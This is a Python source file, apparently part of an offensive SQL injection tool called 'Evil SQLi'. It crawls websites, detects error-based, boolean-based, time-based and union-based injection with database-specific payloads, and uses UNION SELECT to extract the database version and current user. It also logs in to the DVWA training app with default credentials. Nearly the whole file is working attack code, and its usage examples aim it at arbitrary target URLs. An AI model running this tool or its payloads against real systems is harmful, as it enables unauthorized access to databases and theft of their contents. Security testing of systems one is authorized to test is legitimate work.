    def _test_time_based(self, url: str, param: str, dbms: Optional[str], numeric_like: bool) -> Optional[Finding]:
        # Tests for Time-Based SQL Injection.
        diag(f"Trying Time-Based test for parameter '{param}'...")
        baseline_avg = self._avg_elapsed(url, n=2)
        time_based_base_templates = {
            "MySQL": " AND SLEEP({delay})-- -",
            "PostgreSQL": " AND (SELECT pg_sleep({delay}))-- -",
            "MSSQL": "; WAITFOR DELAY '0:0:{delay}'-- -",
            "Oracle": " AND (SELECT COUNT(*) FROM all_users WHERE username='SYS' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})=0)>0-- -",
            "Generic": " AND SLEEP({delay})-- -"
        }
        prefixes_to_test = []
        if numeric_like:
            prefixes_to_test.extend([""])
            prefixes_to_test.append("'")
        else:
            prefixes_to_test.extend(["'"])
            prefixes_to_test.append("")

        for db_candidate, base_tpl in time_based_base_templates.items():
            for prefix in prefixes_to_test:
                for delay in [5]:
                    tb_payload = prefix + base_tpl.format(delay=delay)
                    tb_url = apply_payload_to_url(url, param, tb_payload, append=True)
                    debug(f"Time test -> db={db_candidate} prefix='{prefix}' delay={delay} url={pretty_url(tb_url)}")
                    t0 = time.time()
                    tb_resp = self.client.get(tb_url)
                    elapsed = time.time() - t0
                    debug(f"Time elapsed {elapsed:.2f}s baseline {baseline_avg:.2f}s")
                    if tb_resp and (elapsed - baseline_avg) >= (delay - 1.0):
                        confirm_delay = delay + 2
                        confirm_payload = prefix + base_tpl.format(delay=confirm_delay)
                        confirm_url = apply_payload_to_url(url, param, confirm_payload, append=True)
                        t1 = time.time()
                        confirm_resp = self.client.get(confirm_url)
                        confirm_elapsed = time.time() - t1
                        debug(f"Confirm elapsed {confirm_elapsed:.2f}s")
                        if confirm_resp and (confirm_elapsed - baseline_avg) >= (confirm_delay - 1.0):
                            dbms = db_candidate
                            good(f"Confirmed Time-Based SQLi on {param} (DBMS suspected: {dbms}) with prefix '{prefix}'")
                            severity = self._calculate_severity("Time-Based", dbms)
                            confidence = self._calculate_confidence("Time-Based")
                            finding = Finding(url, param, "Time-Based", tb_payload, dbms, severity, confidence)
                            info(f"Attempting to determine the number of columns for parameter '{param}'...")
                            if self.manual_column_count is not None:
                                cols = self.manual_column_count
                                info(f"Using manually specified column count: {cols} for parameter '{param}'")
                            else:
                                cols = self._determine_column_count(url, param, numeric_like, max_cols=20)
                                debug(f"Column count determined: {cols} (calculated once)")
                            if cols:
                                finding.columns = cols
                                good(f"Determined column count = {cols} for parameter '{param}'")
                                exploiter = Exploiter(self.client, url, param, dbms, cols)
                                finding.version = exploiter.get_version()
                                if finding.version:
                                    good("DB Version Found")
                                    self.injection()
                                    good(f"Extracted DB Version: {finding.version}")
                                finding.current_user = exploiter.get_current_user()
                                if finding.current_user:
                                    good("DB User Found")
                                    self.injection()
                                    good(f"Extracted Current User: {finding.current_user}")
                            return finding
        return None

    def _test_error_based(self, url: str, param: str, dbms: Optional[str], numeric_like: bool, selected_payloads: List[str]) -> Optional[Finding]:
        # Tests for Error-Based SQL Injection
        diag(f"Trying Error-Based test for parameter '{param}'...")
        for payload in selected_payloads:
            test_url = apply_payload_to_url(url, param, payload, append=True)
            debug(f"Error-based test payload= {payload} -> {pretty_url(test_url)}")
            resp = self.client.get(test_url)
            if not resp:
                continue
            eb, db_eb = self.check_error_based(baseline_html := self.client.get(url).text if self.client.get(url) else "", resp.text)
            if eb:
                dbms = detect_dbms(resp.text.lower()) or db_eb or dbms
                good(f"Confirmed Error-Based SQLi on {param} | DBMS: {dbms or 'Unknown'}")
                severity = self._calculate_severity("Error-Based", dbms)
                confidence = self._calculate_confidence("Error-Based")
                finding = Finding(url, param, "Error-Based", payload, dbms, severity, confidence)
                info(f"Attempting to determine the number of columns for parameter '{param}'...")
                if self.manual_column_count is not None:
                    cols = self.manual_column_count
                    info(f"Using manually specified column count: {cols} for parameter '{param}'")
                else:
                    cols = self._determine_column_count(url, param, numeric_like, max_cols=20)
                    debug(f"Column count determined: {cols} (calculated once)")
                if cols:
                    finding.columns = cols
                    good(f"Determined column count = {cols} for parameter '{param}'")
                    exploiter = Exploiter(self.client, url, param, dbms, cols)
                    finding.version = exploiter.get_version()
                    if finding.version:
                        good("DB Version Found")
                        self.injection()
                        good(f"Extracted DB Version: {finding.version}")
                    finding.current_user = exploiter.get_current_user()
                    if finding.current_user:
                        good("DB User Found")
                        self.injection()
                        good(f"Extracted Current User: {finding.current_user}")
                return finding
        return None

    def _test_union_based(self, url: str, param: str, dbms: Optional[str], numeric_like: bool) -> Optional[Finding]:
        # Tests for Union-Based SQL Injection
        diag(f"Trying UNION-Based test for parameter '{param}'...")
        info(f"Attempting to determine the number of columns for parameter '{param}'...")
        if self.manual_column_count is not None:
            cols = self.manual_column_count
            info(f"Using manually specified column count: {cols} for parameter '{param}'")
        else:
            cols = self._determine_column_count(url, param, numeric_like, max_cols=20)
            debug(f"Column count determined: {cols} (calculated once)")
        if cols:
            good(f"UNION-based candidate detected (columns={cols}) for {param}")
            token = self._rand_token(8)
            vals = ["NULL"] * cols
            visible_positions = []
            for pos in range(cols):
                tv = vals.copy()
                tv[pos] = f"'{token}'"
                if numeric_like:
                    payload = f"-1 UNION SELECT {','.join(tv)}-- -"
                else:
                    payload = f"' UNION SELECT {','.join(tv)}-- -"
                test_url = apply_payload_to_url(url, param, payload, append=True)
                debug(f"Testing UNION payload: {payload} -> {pretty_url(test_url)}")
                resp = self.client.get(test_url)
                if resp and token in resp.text:
                    visible_positions.append(pos)
            if visible_positions:
                payload = f"' UNION SELECT {','.join(['NULL']*cols)}-- -"
                severity = self._calculate_severity("Union-Based", dbms)
                confidence = self._calculate_confidence("Union-Based")
                finding = Finding(url, param, "Union-Based", payload, dbms, severity, confidence, columns=cols)
                exploiter = Exploiter(self.client, url, param, dbms, cols)
                finding.version = exploiter.get_version()
                if finding.version:
                    good("DB Version Found")
                    self.injection()
                    good(f"Extracted DB Version: {finding.version}")
                finding.current_user = exploiter.get_current_user()
                if finding.current_user:
                    good("DB User Found")
                    self.injection()
                    good(f"Extracted Current User: {finding.current_user}")
                return finding
            else:
                warn("UNION-based column count found but no reflected columns detected")
        else:
            debug("UNION-based secondary check did not find columns")
        return None

    def scan_param(self, url: str, param: str, folder: str) -> Optional[Finding]:
        # Scans a single parameter for all SQLi techniques
        info(f"Scanning parameter: {param}")
        if "dvwa" in url.lower() and param.lower() == "submit":
            debug(f"Skipping Submit parameter in DVWA")
            return None
        baseline_resp = self.client.get(url)
        if not baseline_resp:
            debug("Baseline request failed")
            return None
        baseline_html = baseline_resp.text
        if "dvwa" in url.lower() and "login" in baseline_html.lower():
            warn("DVWA session may have expired - re-login needed")
            return None
        dbms = detect_dbms(baseline_html.lower()) if baseline_html else None
        if not dbms:
            fp = self.fingerprint_dbms(url, param)
            if fp:
                dbms = fp
                info(f"Fingerprinted DBMS: {dbms}")
            else:
                debug("DBMS fingerprinting inconclusive early")
                
        if self._is_blocked(baseline_html):
            warn(f"Request blocked (WAF/CAPTCHA) for {url}")
            return None
        
        payloads = BUILTIN_PAYLOADS
        selected_payloads = []
        if dbms and dbms in DBMS_SPECIFIC_PAYLOADS:
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["error_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["time_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["boolean_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["union_based"])
        else:
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["error_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["time_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["boolean_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["union_based"])
        selected_payloads.extend(payloads)
        
        try:
            pr = urlparse(url)
            qs = parse_qs(pr.query, keep_blank_values=True)
            orig_val = (qs.get(param, [""])[0]).strip()
            numeric_like = re.fullmatch(r"-?\d+", orig_val) is not None
            debug(f"Original value for '{param}' = '{orig_val}' | numeric_like= {numeric_like}")
        except Exception as ex:
            debug(f"numeric_like detection failed: {ex}")
            numeric_like = False
            
        # --- Error-Based Testing ---
        finding = self._test_error_based(url, param, dbms, numeric_like, selected_payloads)
        if finding:
            return finding
        debug("Error-based test did not confirm SQLi")
        # --- Boolean-Based Testing ---
        finding = self._test_boolean_based(url, param, dbms, numeric_like)
        if finding:
            return finding
        debug("Boolean-based test did not confirm SQLi")
        # --- Time-Based Testing ---
        finding = self._test_time_based(url, param, dbms, numeric_like)
        if finding:
            return finding
        debug("Time-based test did not confirm SQLi")
        # --- Union-Based Testing (Secondary Check) ---
        finding = self._test_union_based(url, param, dbms, numeric_like)
        if finding:
            return finding
        debug("Union-based test did not confirm SQLi")
        warn(f"No SQLi confirmed for parameter '{param}'")
        return None

# ===========================
# Exploitation
# ===========================
class Exploiter:
    # Handles data extraction (e.g., version, user) from a confirmed vulnerability
    def __init__(self, client, url, param, dbms, columns=None):
        self.client = client
        self.url = url
        self.param = param
        self.dbms = dbms
        self.columns = columns or 1

    def _get_numeric_hint(self) -> bool:
        # Determines if the target parameter's original value is numeric
        try:
            pr = urlparse(self.url)
            qs = parse_qs(pr.query, keep_blank_values=True)
            orig_val = (qs.get(self.param, [""])[0]).strip()
            return re.fullmatch(r"-?\d+", orig_val) is not None
        except Exception as ex:
            debug(f"Failed to get original value for numeric hint: {ex}")
            return False

    def _get_comment_suffix(self) -> str:
        # Returns the appropriate SQL comment suffix for the target DBMS
        if self.dbms == "MySQL":
            return "-- -"
        elif self.dbms == "PostgreSQL":
            return "-- "
        elif self.dbms == "MSSQL":
            return "-- -"
        elif self.dbms == "Oracle":
            return "-- "
        else:
            return "-- -"

    def _construct_union_payload(self, cols_list: List[str], prefix: str) -> str:
        # Constructs a UNION SELECT payload with the correct comment suffix
        comment = self._get_comment_suffix()
        if self._get_numeric_hint() and prefix == "":
            return f"{prefix}-1 UNION ALL SELECT {', '.join(cols_list)}{comment}"
        else:
            return f"{prefix} UNION ALL SELECT {', '.join(cols_list)}{comment}"

    def _inject_and_extract(self, query: str) -> Optional[List[str]]:
        # Injects a SQL query via UNION SELECT and attempts to extract the result
        marker = "XDATAX"
        debug(f"Inject & extract | dbms= {self.dbms} cols= {self.columns} query= {query}")
        if not self.columns or self.columns < 1:
            debug("No valid column count determined, aborting extraction.")
            return None
        results: List[str] = []
        is_numeric_hint = self._get_numeric_hint()
        debug(f"Orig val for '{self.param}' numeric hint= {is_numeric_hint}")
        prefixes_to_test = [""] if is_numeric_hint else ["'"]
        prefixes_to_test.append("'" if is_numeric_hint else "")
        for prefix in prefixes_to_test:
            debug(f"Trying prefix: '{prefix}' for extraction")
            for pos in range(self.columns):
                cols_list = [f"{i+10}" for i in range(self.columns)]
                if self.dbms == "MySQL":
                    cols_list[pos] = f"CONCAT('{marker}', ({query}), '{marker}')"
                elif self.dbms in ["PostgreSQL", "Oracle"]:
                    cols_list[pos] = f"'{marker}' || ({query}) || '{marker}'"
                elif self.dbms == "MSSQL":
                    cols_list[pos] = f"'{marker}' + CAST(({query}) AS NVARCHAR(MAX)) + '{marker}'"
                else:
                    cols_list[pos] = f"'{marker}' || ({query}) || '{marker}'"
                union_payload = self._construct_union_payload(cols_list, prefix)
                test_url = apply_payload_to_url(self.url, self.param, union_payload, append=True)
                debug(f"Testing extraction in column {pos+1} with prefix '{prefix}': {pretty_url(test_url)}")
                resp = self.client.get(test_url)
                if not resp:
                    continue
                pattern = re.escape(marker) + r'([a-zA-Z0-9\s\-\_\.\@\:\+\=\(\)]+?)' + re.escape(marker)
                matches = re.findall(pattern, resp.text, re.DOTALL | re.IGNORECASE)
                if matches:
                    for m in matches:
                        val = m.strip().strip("'\" ,")
                        if not val or len(val) < 2:
                            continue
                        if (val.isdigit() or
                            re.match(r'^[\W_]+$', val) or
                            val in [str(i) for i in range(10, 21)] or
                            len(val) > 100):
                            continue
                        clean_result = re.sub(r'<[^>]+>', '', val)
                        clean_result = re.sub(r'&[a-z0-9]+;', '', clean_result)
                        clean_result = re.sub(r'\([^)]*\)', '', clean_result)
                        clean_result = re.sub(r'.*line \d+.*', '', clean_result, flags=re.IGNORECASE)
                        clean_result = re.sub(r'.*</div>.*', '', clean_result, flags=re.IGNORECASE)
                        clean_result = re.sub(r'\b(select|from|where|union|concat|cast|as)\b', '', clean_result, flags=re.IGNORECASE)
                        clean_result = re.sub(r'[\s\r\n]+', ' ', clean_result).strip()
                        clean_result = clean_result.strip('''"',-+*/\\|''')
                        if len(clean_result) < 2 or re.match(r'^[\W_]+$', clean_result):
                            continue
                        if clean_result and clean_result not in results:
                            results.append(clean_result)
                            debug(f"Extracted and filtered result from col {pos+1}: {clean_result}")
        if not results:
            debug("No valuable extraction found after filtering.")
            return None
        debug(f"Final extracted values: {results}")
        return results

    def get_version(self) -> Optional[str]:
        # Attempts to extract the database version
        diag("Trying to Injecting and extracting DB Version:")
        version_queries = {
            "MySQL": "@@version",
            "PostgreSQL": "version()",
            "MSSQL": "@@version",
            "Oracle": "(SELECT banner FROM v$version WHERE rownum=1)",
            "SQLite": "sqlite_version()"
        }
        query = version_queries.get(self.dbms)
        debug(f"get_version query= {query}")
        if not query:
            return None
        results = self._inject_and_extract(query)
        return results[0] if results else None

    def get_current_user(self) -> Optional[str]:
        # Attempts to extract the current database user
        diag("Trying to Injecting and extracting DB User:")
        user_queries = {
            "MySQL": "user()",
            "PostgreSQL": "current_user",
            "MSSQL": "SYSTEM_USER",
            "Oracle": "(SELECT user FROM dual)",
            "SQLite": "CURRENT_USER"
        }
        query = user_queries.get(self.dbms)
        debug(f"get_current_user query= {query}")
        if not query:
            return None
        results = self._inject_and_extract(query)
        return results[0] if results else None

# ===========================
# Orchestrator
# ===========================
class App:
    # Main application class that handles argument parsing and orchestrates the scan.
    def __init__(self, config: Optional[Config] = None):
        self.config = config or Config()
        self.client = HttpClient(timeout=self.config.timeout, delay=self.config.delay, use_cookies=self.config.use_cookies)
        self.scanner = Scanner(self.client)

    def _setup_logging(self, verbose: bool) -> None:
        # Sets up logging to file and console.
        level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            level=level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(os.path.join(SCRIPT_DIR, 'sqli_scanner.log')),
                logging.StreamHandler()
            ]
        )

    def run(self, args_list=None) -> None:
        # Main entry point. Parses arguments and initiates crawl or scan.
        import argparse
        parser = argparse.ArgumentParser(
            description=(
                "Evil SQLi"
                "SQL Injection Scanner"
                "--------------------------------------------------"
                "Supports crawling websites to discover parameters"
                "and scanning for multiple SQLi techniques:"
                "  - Error-Based"
                "  - Boolean-Based"
                "  - Time-Based"
                "  - Union-Based"
                "  - DVWA Auto Login"
                "  - Fingerprinting DBMS"
                "  - Determining number of columns"
                "  - Extracting DB Version and Current User"
                "  - Manual Column Count Specification"
                "--------------------------------------------------"
            ),
            formatter_class=argparse.RawTextHelpFormatter,
            epilog=(
                "Examples:"
                "  python Evil_SQLi.py -u https://example.com --mode crawl --depth 3"
                "  python Evil_SQLi.py -u https://target.com/page.php?id=1 --mode scan"
                "  python Evil_SQLi.py -u https://site.com --mode scan --depth 4 --timeout 15 --delay 1.0"
                "  python Evil_SQLi.py -u https://demo.com --mode scan --no-cookies --verbose"
                "  python Evil_SQLi.py -u https://test.com --mode scan --output results_folder"
                "  python Evil_SQLi.py -u http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit --dvwa-login"
            )
        )
        parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
        parser.add_argument('--mode', choices=['crawl', 'scan'], default='scan',
                            help=("Operation mode:"
                                "  crawl -> discover URLs and parameters only"
                                "  scan  -> discover and actively test for SQL injection vulnerabilities"))
        parser.add_argument('--depth', type=int, default=2, help='Crawl depth (default: 2)')
        parser.add_argument('--delay', type=float, default=0.5, help='Delay between HTTP requests in seconds (default: 0.5)')
        parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
        parser.add_argument('--no-cookies', action='store_true', help='Disable cookies and do not maintain session state')
        parser.add_argument('--verbose', action='store_true', help='Enable verbose logging (prints debug info)')
        parser.add_argument('--output', type=str, default=None, help='Custom output directory (default: domain-based folder in script directory)')
        parser.add_argument('--debug', action='store_true', help='Enable extra debug prints to console')
        parser.add_argument('--dvwa-login', action='store_true', help='Auto login to DVWA before scanning (username=admin, password=password, security=low)')
        parser.add_argument('--column', '-c', type=int, metavar='N',
                            help='Manually specify the number of columns in the target SQL query. '
                                 'Skips automatic column count detection and uses this value for data extraction.')

        args = parser.parse_args(args_list)

        global DEBUG
        DEBUG = bool(args.debug)
        self._setup_logging(args.verbose)

        self.client = HttpClient(timeout=args.timeout, delay=args.delay, use_cookies=not args.no_cookies)
        self.scanner = Scanner(self.client)
        self.scanner.manual_column_count = args.column

        debug(f"Client config | timeout= {args.timeout}s delay= {args.delay}s use_cookies= {not args.no_cookies}")

        if args.dvwa_login or "dvwa" in args.url.lower():
            from urllib.parse import urlparse
            base_url = f"{urlparse(args.url).scheme}://{urlparse(args.url).netloc}/dvwa"
            if self.client.login_dvwa(base_url, username="admin", password="password", security="low"):
                info("DVWA authentication successful")
            else:
                warn("DVWA authentication failed, continuing unauthenticated")

        folder = domain_folder(args.url)
        if args.output:
            folder = os.path.join(SCRIPT_DIR, args.output)
            os.makedirs(folder, exist_ok=True)

        if args.mode == 'crawl':
            info(f"Starting crawl on {args.url} with depth {args.depth}")
            self.do_crawl(args.url, args.depth, folder=folder)
        elif args.mode == 'scan':
            info(f"Starting scan on {args.url} with depth {args.depth}")
            self.do_scan(args.url, args.depth, folder=folder)

    def do_crawl(self, target: str, depth: int, folder: str) -> None:
        # Performs a crawl-only operation and saves discovered endpoints.
        crawler = Crawler(target, depth=depth, client=self.client)
        results = crawler.run()
        lines = [f"{r.url} -> {r.params}" for r in results]
        save_text(folder, "crawl_result.txt", lines)

    def do_scan(self, target: str, depth: int, folder: str) -> None:
        # Performs a full scan, testing each parameter and saving findings.
        parsed = urlparse(target)
        if parsed.query and parse_qs(parsed.query):
            params = list(parse_qs(parsed.query).keys())
            endpoints = [CrawlResult(target, params)]
            info(f"Scanning provided URL directly with parameters: {params}")
        else:
            crawler = Crawler(target, depth=depth, client=self.client)
            endpoints = crawler.run()
            if not endpoints:
                warn("No endpoints with query parameters discovered during crawl.")

        info("Using built-in payloads and error patterns")

        for ep in endpoints:
            if not ep.params:
                continue
            info(f"Testing URL: {ep.url}")
            for p in ep.params:
                finding = self.scanner.scan_param(ep.url, p, folder)
                if finding:
                    self.scanner.findings.append(finding)

        lines = [
            (f"{f.technique} | url= {f.url} | param= {f.param} | payload= {f.payload} | dbms= {f.dbms or ''} "
             f"| severity= {f.severity} | confidence= {f.confidence} | columns= {f.columns if f.columns else ''}"
             f"| version= {f.version if f.version else ''} | user= {f.current_user if f.current_user else ''}")
            for f in self.scanner.findings
        ]
        if lines:
            save_text(folder, "scan_result.txt", lines)
            save_json(
                folder,
                "scan_result.json",
                {"target": target, "findings": [f.to_dict() for f in self.scanner.findings]},
            )
        else:
            warn("No confirmed SQLi findings. Nothing to save.")

# ===========================
# Entry
# ===========================
if __name__ == "__main__":
    Symbol()
    try:
        App().run(sys.argv[1:])
    except KeyboardInterrupt:
        print()
        warn("Interrupted by user.")
